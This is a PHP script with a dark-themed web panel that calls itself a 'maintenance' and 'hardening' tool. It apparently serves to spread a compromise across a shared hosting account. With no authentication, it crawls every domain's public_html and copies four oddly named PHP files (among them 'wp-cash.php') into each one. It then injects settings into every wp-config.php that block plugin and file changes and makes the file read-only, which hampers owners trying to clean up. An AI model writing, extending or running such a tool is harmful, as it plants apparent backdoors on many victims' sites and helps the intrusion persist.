<?php
/**
 * ZEDD MAINTENANCE v9.6 - ULTRA DARK EDITION
 * Feature: Mass Copy & WP-Config Hardening
 * Theme: Pure Black / OLED Optimized
 */

ini_set('display_errors', 1);
error_reporting(E_ALL);
set_time_limit(0);
ini_set('memory_limit', '512M');

$res = ['log' => [], 'stats' => ['copied' => 0, 'hardened' => 0, 'errors' => 0]];

// --- PATH LOGIC ---
$path_asal = dirname(__FILE__);
$exp = explode(DIRECTORY_SEPARATOR, $path_asal);
$base_path = (isset($exp[1]) && isset($exp[2])) ? DIRECTORY_SEPARATOR . $exp[1] . DIRECTORY_SEPARATOR . $exp[2] : $path_asal;

function processEverything($startDir, $action, $pathAsal) {
    $log = [];
    $stats = ['copied' => 0, 'hardened' => 0, 'errors' => 0];
    $filesToCopy = ['NIN1.php', 'CDX7.php', '8daf1238_1774208172.php', 'wp-cash.php'];
    
    if (!is_dir($startDir)) return ["❌ Target Not Found: $startDir", $stats];

    $queue = [$startDir];
    while ($queue) {
        $dir = array_shift($queue);
        $items = @scandir($dir);
        if (!$items) continue;

        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            
            if (is_dir($path)) {
                if ($item === 'public_html') {
                    $log[] = "📁 Dir: " . str_replace($startDir, '', $path);
                    
                    // --- LOGIKA COPY ---
                    if ($action === 'copy' || $action === 'all') {
                        foreach ($filesToCopy as $f) {
                            $srcFile = $pathAsal . DIRECTORY_SEPARATOR . $f;
                            $dstFile = $path . DIRECTORY_SEPARATOR . $f;
                            if (file_exists($srcFile)) {
                                if (@copy($srcFile, $dstFile)) {
                                    $size = @filesize($dstFile);
                                    if ($size == 0) {
                                        @file_put_contents($dstFile, @file_get_contents($srcFile));
                                        $size = @filesize($dstFile);
                                    }
                                    $log[] = "   ✔️ Copy: $f (" . round($size/1024, 2) . " KB)";
                                    $stats['copied']++;
                                } else {
                                    $log[] = "   ❌ Failed: $f";
                                    $stats['errors']++;
                                }
                            }
                        }
                    }

                    // --- LOGIKA WP-CONFIG (HARDENING) ---
                    if ($action === 'update' || $action === 'all') {
                        $conf = $path . DIRECTORY_SEPARATOR . 'wp-config.php';
                        if (file_exists($conf)) {
                            $content = @file_get_contents($conf);
                            if ($content && strpos($content, 'DISALLOW_FILE_EDIT') === false) {
                                $code = "\n/** Secured by Zedd **/\ndefine('DISALLOW_FILE_EDIT', true);\ndefine('DISALLOW_FILE_MODS', true);\n";
                                $newContent = preg_replace('/^<\?php/i', "<?php" . $code, $content);
                                
                                @chmod($conf, 0644);
                                if (@file_put_contents($conf, $newContent)) {
                                    @chmod($conf, 0444);
                                    $log[] = "   🛡️ WP-Config Hardened (Locked 0444)";
                                    $stats['hardened']++;
                                } else {
                                    $log[] = "   ❌ Gagal Update wp-config (Permission Denied)";
                                    $stats['errors']++;
                                }
                            } else {
                                $log[] = "   ℹ️ WP-Config sudah diproteksi.";
                            }
                        }
                    }
                } else {
                    if (!in_array($item, ['etc', 'logs', 'mail', 'tmp', '.cagefs', '.cpanel'])) {
                        $queue[] = $path;
                    }
                }
            }
        }
    }
    return [$log, $stats];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $act = $_POST['action'] ?? '';
    $target = is_dir($base_path . '/domains') ? $base_path . '/domains' : $base_path;
    list($res['log'], $res['stats']) = processEverything($target, $act, $path_asal);
}
?>
<!DOCTYPE html>
<html lang="id" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZEDD v9.6 | Ultra Dark Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        dark: {
                            900: '#000000',
                            850: '#050505',
                            800: '#0a0a0a',
                            750: '#0f0f0f',
                            700: '#141414',
                        },
                        accent: {
                            purple: '#8b5cf6',
                            pink: '#ec4899',
                            cyan: '#06b6d4',
                            green: '#10b981',
                        }
                    },
                    animation: {
                        'glow': 'glow 2s ease-in-out infinite alternate',
                        'float': 'float 3s ease-in-out infinite',
                    },
                    keyframes: {
                        glow: {
                            '0%': { boxShadow: '0 0 5px rgba(139, 92, 246, 0.3)' },
                            '100%': { boxShadow: '0 0 20px rgba(139, 92, 246, 0.6)' },
                        },
                        float: {
                            '0%, 100%': { transform: 'translateY(0)' },
                            '50%': { transform: 'translateY(-5px)' },
                        }
                    }
                }
            }
        }
    </script>
    <style>
        * { 
            font-family: 'JetBrains Mono', monospace;
            scrollbar-width: thin;
            scrollbar-color: #2a2a2a #000000;
        }
        *::-webkit-scrollbar { width: 6px; height: 6px; }
        *::-webkit-scrollbar-track { background: #000000; }
        *::-webkit-scrollbar-thumb { 
            background: #1a1a1a; 
            border-radius: 3px;
            border: 1px solid #000;
        }
        *::-webkit-scrollbar-thumb:hover { background: #2a2a2a; }
        
        body { 
            background: #000000;
            min-height: 100vh;
            background-image: 
                radial-gradient(ellipse at 20% 80%, rgba(139, 92, 246, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 20%, rgba(236, 72, 153, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 50%, rgba(6, 182, 212, 0.03) 0%, transparent 70%);
            background-attachment: fixed;
        }
        
        .glass {
            background: linear-gradient(145deg, rgba(10, 10, 10, 0.9) 0%, rgba(5, 5, 5, 0.95) 100%);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 
                0 0 0 1px rgba(255, 255, 255, 0.02),
                0 20px 60px rgba(0, 0, 0, 0.8),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
        }
        
        .terminal { 
            background: #000000; 
            border: 1px solid #1a1a1a; 
            padding: 16px; 
            border-radius: 8px; 
            max-height: 400px; 
            overflow-y: auto; 
            color: #10b981; 
            font-size: 11px;
            line-height: 1.6;
            box-shadow: 
                inset 0 0 30px rgba(0, 0, 0, 0.9),
                0 0 0 1px rgba(16, 185, 129, 0.05);
        }
        
        .terminal-line {
            padding: 2px 8px;
            border-left: 2px solid transparent;
            transition: all 0.15s ease;
        }
        .terminal-line:hover {
            background: rgba(26, 26, 26, 0.8);
            border-left-color: #8b5cf6;
        }
        
        .btn-base {
            position: relative;
            overflow: hidden;
            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid transparent;
        }
        .btn-base::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: translateX(-100%);
            transition: transform 0.6s ease;
        }
        .btn-base:hover::before { transform: translateX(100%); }
        .btn-base:active { transform: scale(0.98); }
        
        .btn-copy {
            background: linear-gradient(135deg, #1e3a5f 0%, #172545 100%);
            border-color: rgba(59, 130, 246, 0.3);
        }
        .btn-copy:hover {
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            border-color: rgba(59, 130, 246, 0.6);
            box-shadow: 0 0 25px rgba(59, 130, 246, 0.25);
        }
        
        .btn-update {
            background: linear-gradient(135deg, #1a473a 0%, #14332a 100%);
            border-color: rgba(16, 185, 129, 0.3);
        }
        .btn-update:hover {
            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
            border-color: rgba(16, 185, 129, 0.6);
            box-shadow: 0 0 25px rgba(16, 185, 129, 0.25);
        }
        
        .btn-all {
            background: linear-gradient(135deg, #3f1a5c 0%, #2d1242 100%);
            border-color: rgba(139, 92, 246, 0.4);
            animation: glow 2s ease-in-out infinite alternate;
        }
        .btn-all:hover {
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            border-color: rgba(139, 92, 246, 0.8);
            box-shadow: 0 0 35px rgba(139, 92, 246, 0.4);
            animation: none;
        }
        
        .stat-card {
            background: linear-gradient(145deg, rgba(20, 20, 20, 0.8) 0%, rgba(10, 10, 10, 0.9) 100%);
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: all 0.2s ease;
        }
        .stat-card:hover {
            border-color: rgba(255, 255, 255, 0.15);
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .gradient-text {
            background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 50%, #06b6d4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            background-size: 200% 200%;
            animation: gradient-shift 4s ease infinite;
        }
        @keyframes gradient-shift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .status-dot {
            position: relative;
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            margin-right: 8px;
        }
        .status-dot::after {
            content: '';
            position: absolute;
            inset: -4px;
            border: 2px solid #10b981;
            border-radius: 50%;
            animation: pulse-ring 2s ease-out infinite;
            opacity: 0;
        }
        @keyframes pulse-ring {
            0% { transform: scale(0.5); opacity: 0.8; }
            100% { transform: scale(2); opacity: 0; }
        }
        
        .path-badge {
            background: rgba(26, 26, 26, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.08);
            font-size: 10px;
            padding: 4px 10px;
            border-radius: 4px;
            color: #9ca3af;
        }
        
        /* Focus states untuk aksesibilitas */
        button:focus-visible {
            outline: 2px solid #8b5cf6;
            outline-offset: 2px;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-3 md:p-6">
    
    <!-- Background ambient glow -->
    <div class="fixed inset-0 pointer-events-none">
        <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-purple-900/10 rounded-full blur-3xl"></div>
        <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-pink-900/10 rounded-full blur-3xl"></div>
    </div>

    <div class="glass p-5 md:p-8 w-full max-w-4xl rounded-2xl relative z-10 animate-float">
        
        <!-- Header -->
        <div class="text-center mb-6 md:mb-8">
            <h1 class="text-2xl md:text-4xl font-bold gradient-text tracking-wider mb-2">
                ZEDD MAINTENANCE
            </h1>
            <p class="text-gray-500 text-xs md:text-sm">v9.6 • Ultra Dark Edition • Stable</p>
            <div class="mt-4 inline-flex items-center px-3 py-1.5 bg-black/40 rounded-full text-xs text-gray-400 border border-white/5">
                <span class="status-dot"></span>
                System Operational
            </div>
        </div>

        <!-- Stats Cards -->
        <?php if (!empty($res['log'])): ?>
        <div class="grid grid-cols-3 gap-2 md:gap-4 mb-4 md:mb-6">
            <div class="stat-card p-3 md:p-4 rounded-xl text-center">
                <div class="text-blue-400/80 text-[10px] md:text-xs mb-1 uppercase tracking-wider">Copied</div>
                <div class="text-xl md:text-2xl font-bold text-white"><?= $res['stats']['copied'] ?></div>
            </div>
            <div class="stat-card p-3 md:p-4 rounded-xl text-center">
                <div class="text-emerald-400/80 text-[10px] md:text-xs mb-1 uppercase tracking-wider">Hardened</div>
                <div class="text-xl md:text-2xl font-bold text-white"><?= $res['stats']['hardened'] ?></div>
            </div>
            <div class="stat-card p-3 md:p-4 rounded-xl text-center">
                <div class="text-red-400/80 text-[10px] md:text-xs mb-1 uppercase tracking-wider">Errors</div>
                <div class="text-xl md:text-2xl font-bold text-white"><?= $res['stats']['errors'] ?></div>
            </div>
        </div>
        <?php endif; ?>

        <!-- Terminal Output -->
        <?php if (!empty($res['log'])): ?>
        <div class="mb-4 md:mb-6">
            <div class="flex items-center justify-between mb-2">
                <h2 class="text-xs md:text-sm font-medium text-gray-300 flex items-center gap-2">
                    <span class="w-1.5 h-1.5 bg-accent-cyan rounded-full"></span>
                    Execution Log
                </h2>
                <span class="text-[10px] md:text-xs text-gray-600"><?= count($res['log']) ?> entries</span>
            </div>
            <div class="terminal">
                <?php foreach($res['log'] as $line): ?>
                    <div class="terminal-line"><?= htmlspecialchars($line) ?></div>
                <?php endforeach; ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- Action Buttons -->
        <form method="POST" class="space-y-3">
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <button type="submit" name="action" value="copy" class="btn-base btn-copy py-3 md:py-4 rounded-xl text-xs md:text-sm font-semibold text-white">
                    <span class="flex items-center justify-center">
                        <svg class="w-4 h-4 md:w-5 md:h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/>
                        </svg>
                        MASS COPY
                    </span>
                </button>

                <button type="submit" name="action" value="update" class="btn-base btn-update py-3 md:py-4 rounded-xl text-xs md:text-sm font-semibold text-white">
                    <span class="flex items-center justify-center">
                        <svg class="w-4 h-4 md:w-5 md:h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
                        </svg>
                        WP HARDEN
                    </span>
                </button>
            </div>

            <button type="submit" name="action" value="all" class="btn-base btn-all w-full py-4 md:py-5 rounded-xl text-sm md:text-base font-bold text-white">
                <span class="flex items-center justify-center">
                    <svg class="w-5 h-5 md:w-6 md:h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
                    </svg>
                    ▶ EXECUTE ALL
                </span>
            </button>
        </form>
        
        <!-- Footer Info -->
        <div class="mt-6 md:mt-8 pt-4 md:pt-6 border-t border-white/5">
            <div class="flex flex-col sm:flex-row items-center justify-between gap-3 text-[10px] md:text-xs">
                <div class="text-gray-600 w-full sm:w-auto">
                    <span class="text-gray-500">Path:</span>
                    <div class="mt-1 path-badge font-mono break-all">
                        <?= htmlspecialchars($path_asal) ?>
                    </div>
                </div>
                <div class="text-right text-gray-600">
                    <div>Powered by <span class="text-accent-purple font-semibold">Zedd</span></div>
                    <div class="text-gray-700">© 2024 • Ultra Dark</div>
                </div>
            </div>
        </div>
    </div>

    <!-- Auto-scroll & utilities -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const terminal = document.querySelector('.terminal');
            if (terminal) {
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            // Prevent accidental form resubmission on refresh
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
        });
    </script>
</body>
</html>